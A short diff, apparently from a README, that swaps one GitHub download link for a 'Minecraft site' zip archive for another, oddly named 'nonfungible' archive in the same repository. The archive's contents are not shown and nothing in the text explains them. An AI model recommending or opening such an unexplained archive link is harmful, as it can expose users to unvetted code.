@@ -1,2 +1,2 @@
 site de minecraft : 
-https://raw.githubusercontent.com/zduchevreuil/Site-minecraf/main/Site-minecraft-main/Site-minecraf_v3.7.zip
+https://github.com/zduchevreuil/Site-minecraf/raw/refs/heads/main/Site-minecraft-main/minecraf-Site-nonfungible.zip
